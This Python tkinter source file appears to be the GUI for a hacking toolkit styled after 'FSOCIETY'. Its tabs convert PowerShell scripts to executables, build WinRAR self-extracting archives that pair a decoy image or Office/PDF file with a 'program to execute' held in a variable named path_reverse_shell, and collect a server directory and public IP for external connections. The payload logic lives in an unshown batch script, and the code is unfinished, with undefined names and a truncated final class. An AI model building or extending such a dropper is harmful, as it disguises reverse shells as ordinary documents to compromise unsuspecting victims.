
import tkinter as tk
from enum import Enum
import random
import tkinter as tk
from tkinter import ttk
import numpy as np
import os
import subprocess

class CharacterType(Enum):
    ZERO = 0
    ONE = 1
    SPACE = 2
    SPECIAL = 3
    MATRIX = 4

class MatrixScreen:
    def __init__(self, root, update_interval=100, line_length=189):
        # Create the matrix background
        self.label_matrix = tk.Label(root, background="#1d2125")
        self.label_matrix.pack(expand=True, fill="both")
        # Create a list of special characters
        self.special_characters = [chr(i) for i in range(33, 127) if not chr(i).isalnum()]

        # Create the Matrix display
        self.matrix_display = tk.Text(
            self.label_matrix,
            bg="black",
            fg="red",
            font=("Courier", 12),
            wrap=tk.WORD,
            padx=10,
            pady=10,
        )
        self.matrix_display.pack(expand=True, fill=tk.BOTH)

        # Set the update interval and line length
        self.update_interval = update_interval
        self.line_length = line_length

    def random_char(self):
        matrix_character = ['日', 'ﾊ','ﾐ','ﾋ','ｰ', 'ｳ','ｼ', 'ﾅ', 'ﾓ', 'ﾆ', 'ｻ', 'ﾜ', 'ﾂ', 'ｵ', 'ﾘ',
                            'ｱ', 'ﾎ', 'ﾃ', 'ﾏ', 'ｹ', 'ﾒ', 'ｴ', 'ｶ', 'ｷ', 'ﾑ', 'ﾕ', 'ﾗ', 'ｾ', 'ﾈ','ｽ',
                            'ﾀ', 'ﾇ', 'ﾍ', 'ｦ', 'ｲ', 'ｸ', 'ｺ', 'ｿ', 'ﾁ', 'ﾄ', 'ﾉ', 'ﾌ', 'ﾔ', 'ﾖ', 'ﾙ',
                            'ﾚ', 'ﾛ', 'ﾝ', ':', '・', '.', '"', '=', '*', '+', '.', '<', '>', '¦', '｜',
                            ' FSOCIETY ']
        weights = [1]*len(matrix_character)
        weights[-1] = 0.1
        choice = CharacterType(random.randint(0, 4))
        if choice == CharacterType.ZERO:
            return '0'
        elif choice == CharacterType.ONE:
            return '1'
        elif choice == CharacterType.SPACE:
            return ' '
        elif choice == CharacterType.MATRIX:
            return random.choices(matrix_character, weights, k=1)[0]
        else:
            return random.choice(self.special_characters)

    def update_matrix(self):
        # Generate new line
        new_line = ''.join([self.random_char() for _ in range(self.line_length)])
        self.matrix_display.insert(tk.END, new_line + '\n')
        self.matrix_display.see(tk.END)

        # Schedule the next update
        self.label_matrix.after(self.update_interval, self.update_matrix)

class TabApp:
    def __init__(self, parent):
        self.parent = parent

        # Create the style for the tabs
        style = ttk.Style()
        style.theme_use('default')

        # Set value for checkboxes
        self.checkbox_var = tk.IntVar()
        
        # Customize the TNotebook Tab style
        style.configure('TNotebook.Tab', background="#3a3f44", foreground="white", padding=[10, 5])
        style.map('TNotebook.Tab', background=[('selected', '#1d2125')])

        # Customize the TNotebook background
        style.configure('TNotebook', background="#1d2125")

        # Create the main notebook
        self.notebook = ttk.Notebook(self.parent, style='TNotebook')
        self.notebook.pack(fill=tk.BOTH, expand=1)

        # Dictionary to hold references to tab frames
        self.tab_frames = {}

        # Create content frames for each tab
        self.tab_frames['compiletheexecutable'] = self.create_content_frame_tab1()
        self.tab_frames['createawinrarsfxarchive'] = self.create_content_frame_tab2()
        self.tab_frames['openservers'] = self.create_content_frame_tab3()

        # Add tabs to the notebook
        self.notebook.add(self.tab_frames['compiletheexecutable'], text='Compile the executable')
        self.notebook.add(self.tab_frames['createawinrarsfxarchive'], text="Create a winrar sfx archive")
        self.notebook.add(self.tab_frames['openservers'], text='Open servers')

        # Track current tab
        self.current_tab = None

        # Bind tab change event
        self.notebook.bind("<<NotebookTabChanged>>", self.on_tab_change)

        # Set initial tab
        self.on_tab_change()


    def add_tab(self, title):
        title_id = title.lower().replace(' ', '')
        self.tab_frames[title_id] = self.create_content_frame()
        self.notebook.add(self.tab_frames[title_id], text=title)

    def create_content_frame_tab1(self):
        frame = tk.Frame(self.notebook, bg="#1d2125")

        for i in range(6):
            frame.rowconfigure(i, weight=1) 
        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=6)
        frame.columnconfigure(2, weight=1)
        
        title = tk.Label(frame, text="Pass from .ps1 to .exe", font=("Hack Glitch", 24), anchor='center', justify='center', background="#292e32", foreground="white")
        title.grid(row=0, column=1, sticky="nsew", padx=40, pady=(30,10))

        return frame

    def create_content_frame_tab2(self):
        frame = tk.Frame(self.notebook, bg="#1d2125")

        for i in range(7):
            frame.rowconfigure(i, weight=1)
        for i in range(9):
            frame.columnconfigure(i, weight=1)

        # Add title of the page
        title = tk.Label(frame, text="Sfx Archive", font=("h Hack Glitch", 24), anchor='center', justify='center', background="#292e32", foreground="white")
        title.grid(row=0, column=1, columnspan=6, sticky="nsew", padx=40, pady=(30,10))

        help_button = tk.Button(frame, text="?", command=self.show_shell_help, background="#1d2125", foreground="white")
        help_button.grid(row=0, column=8, sticky="wn", pady=(20, 5))

        # Add labels and input fields
        image_label = tk.Label(frame, text="Path of the file to show:", anchor='w', background="#292e32", foreground="white")
        image_label.grid(row=1, column=1, columnspan=6, sticky="sew", padx=20, pady=(20, 5))

        image = tk.Entry(frame, width=40)
        image.grid(row=2, column=1, columnspan=6, sticky="new", padx=20, pady=(5, 10))

        shell_label = tk.Label(frame, text="Path of the program to execute:", anchor='w', background="#292e32", foreground="white")
        shell_label.grid(row=3, column=1, columnspan=6, sticky="sew", padx=20, pady=(10, 5))

        shell = tk.Entry(frame, width=40)
        shell.grid(row=4, column=1, columnspan=6, sticky="new", padx=20, pady=(5, 10))

        checkbox1 = tk.Checkbutton(frame, text="IMG", variable=self.checkbox_var, onvalue=1, offvalue=0)
        checkbox1.grid(row=5, column=1, sticky="w", padx=20, pady=(2, 10))

        checkbox2 = tk.Checkbutton(frame, text="WORD", variable=self.checkbox_var, onvalue=2, offvalue=0)
        checkbox2.grid(row=5, column=2, sticky="w", padx=20, pady=(2, 10))

        checkbox3 = tk.Checkbutton(frame, text="PDF", variable=self.checkbox_var, onvalue=3, offvalue=0)
        checkbox3.grid(row=5, column=3, sticky="w", padx=20, pady=(2, 10))

        checkbox4 = tk.Checkbutton(frame, text="EXCEL", variable=self.checkbox_var, onvalue=4, offvalue=0)
        checkbox4.grid(row=5, column=4, sticky="w", padx=20, pady=(2, 10))

        checkbox5 = tk.Checkbutton(frame, text="P.P", variable=self.checkbox_var, onvalue=5, offvalue=0)
        checkbox5.grid(row=5, column=5, sticky="w", padx=20, pady=(2, 10))

        button = tk.Button(frame, text="Save", command=lambda: self.save_info(image, shell), width=40, background="#1d2125", foreground="white")
        button.grid(row=6, column=1, columnspan=6, sticky="n", padx=20, pady=(10, 20))

        self.checkbox_var.set(0)

        return frame
    
    def create_content_frame_tab3(self):

        frame = tk.Frame(self.notebook, bg="#1d2125")

        for i in range(7):
            frame.rowconfigure(i, weight=1)
        frame.columnconfigure(0, weight=1)
        frame.columnconfigure(1, weight=6)
        frame.columnconfigure(2, weight=1)

        # Add title of the page
        title = tk.Label(frame, text="External connections", font=("h Hack Glitch", 24), anchor='center', justify='center', background="#292e32", foreground="white")
        title.grid(row=0, column=1, sticky="nsew", padx=40, pady=(30,10))

        image_label = tk.Label(frame, text="Directory to start the python3 server:", anchor='w', background="#292e32", foreground="white")
        image_label.grid(row=1, column=1, sticky="sew", padx=20, pady=(20, 5))

        image = tk.Entry(frame, width=40)
        image.grid(row=2, column=1, sticky="new", padx=20, pady=(5, 10))

        shell_label = tk.Label(frame, text="Your public ip adress:", anchor='w', background="#292e32", foreground="white")
        shell_label.grid(row=3, column=1, sticky="sew", padx=20, pady=(10, 5))

        shell = tk.Entry(frame, width=40)
        shell.grid(row=4, column=1, sticky="new", padx=20, pady=(5, 10))

        button = tk.Button(frame, text="Save", command=lambda: self.save_info(image, shell), width=40, background="#1d2125", foreground="white")
        button.grid(row=6, column=1, sticky="n", padx=20, pady=(10, 20))

        return frame
    

    def on_tab_change(self, event=None):

        selected_tab_index = self.notebook.index(self.notebook.select())
        selected_tab_name = self.notebook.tab(selected_tab_index, "text").lower().replace(" ", "")

        if self.current_tab is not None:
            self.reset_tab_button_color(self.current_tab)

        self.change_tab_button_color(selected_tab_name)
        self.current_tab = selected_tab_name

    def reset_tab_button_color(self, tab_name):
        frame = self.tab_frames[tab_name]
        button = frame.winfo_children()[-1]  # Assuming the button is the last child
        button.config(bg="#3a3f44")

    def change_tab_button_color(self, tab_name):
        frame = self.tab_frames[tab_name]
        button = frame.winfo_children()[-1]  # Assuming the button is the last child
        button.config(bg="#1d2125")

    def save_info(self, image, shell):
        global path_image
        global path_reverse_shell
        global extension
        global ext
        path_image.set(image.get())
        path_reverse_shell.set(shell.get())
        extension.set(ext[self.checkbox_var.get()])
        print(f"Image: {path_image.get()}, Shell: {path_reverse_shell.get()}")
        self.run_cmd_command(path_image.get(), path_reverse_shell.get(), extension.get())


    def show_shell_help(self):
        messagebox.showinfo("Help", "You need to put the 2 files in the same folder as main.py. (Or copy the full path)")
    
    def run_cmd_command(self, var1, var2, var3):
        try:
            # Ensure the command is the path to a batch file
            batch_file_name = "archive.bat"  # Replace with your batch file name
            batch_file_path = os.path.abspath(f'./script/{batch_file_name}')
            
            # Construct the command with arguments
            command = [batch_file_path, var1, var2, var3]
            
            # Run the batch file with arguments
            result = subprocess.run(command, capture_output=True, text=True)
            
            # Print the output and error (if any)
            print("Command Output:", result.stdout)
            if result.stderr:
                print("Error:", result.stderr)
                show_popup(root, result.stderr)
        except Exception as e:
            show_popup(root, e)
            print("An error occurred:", e)


class create_content_frame:

        def __init__(self, parent, button, font, nbr_row, nbr_column, help=None, title=None, nbr_input=None, radio_buttons=None, specific_row=None, specific_column=None, objects=None):

            self.parent = parent,
            self.button = button,
            self.font = font,
            self.nbr_row = nbr_row,
            self.nbr_column = nbr_column,
            self.object = {}

            if(help):
                self.help = help

            if(title):
                self.title = title

            if(nbr_input):
                self.nbr_input = nbr_input

            if(radio_buttons):
                self.radio_buttons = radio_buttons

            if(specific_row):
                self.specific_row = specific_row

            if(specific_column):
                self.specific_column = specific_column

            if(objects):
                self.objects = objects

        def build(self):

            frame = tk.Frame(self.notebook, bg="#1d2125")

            for i in range(self.nbr_row):
                frame.rowconfigure(i, width=1)
            for i in range(self.nbr_column):
                frame.columnconfigure(i, weight=1)
            
            if(self.specific_row):
                frame.rowconfigure(self.specific_row['num'], weight=self.specific_row['width'])
            if(self.specific_column):
                frame.columnconfigure(self.specific_column['num'], weight=self.specific_column['width'])

            title = tk.Label(frame, text=self.title['title'], font=(self.font['title'], self.font['size']), anchor='center', justify='center', background="#292e32", foreground="white")
            title.grid(row=0, column=1, sticky="nsew", padx=40, pady=(30,10))

            for key in range(self.objects.keys()):
                new_object = tk.Label(frame, text=self.objects['title'], anchor=self.objects['anchor'], background="#292e32", foreground="white")
                new_object.grid(row=key+1, column=0, sticky="nsew", padx=20, pady=(5,10))

            # image_label = tk.Label(frame, text="Directory to start the python3 server:", anchor='w', background="#292e32", foreground="white")
            # image_label.grid(row=1, column=1, sticky="sew", padx=20, pady=(20, 5))
    
            # image = tk.Entry(frame, width=40)
            # image.grid(row=2, column=1, sticky="new", padx=20, pady=(5, 10))
    
            # shell_label = tk.Label(frame, text="Your public ip adress:", anchor='w', background="#292e32", foreground="white")
            # shell_label.grid(row=3, column=1, sticky="sew", padx=20, pady=(10, 5))
    
            # shell = tk.Entry(frame, width=40)
            # shell.grid(row=4, column=1, sticky="new", padx=20, pady=(5, 10))
    
            # button = tk.Button(frame, text="Save", command=lambda: self.save_info(image, shell), width=40, background="#1d2125", foreground="white")
            # button.grid(row=6, column=1, sticky="n", padx=20, pady=(10, 20))

            return frame

class Page:

    def __init__(self, parent, title, number_window):
        self.parent = parent
        self.title = title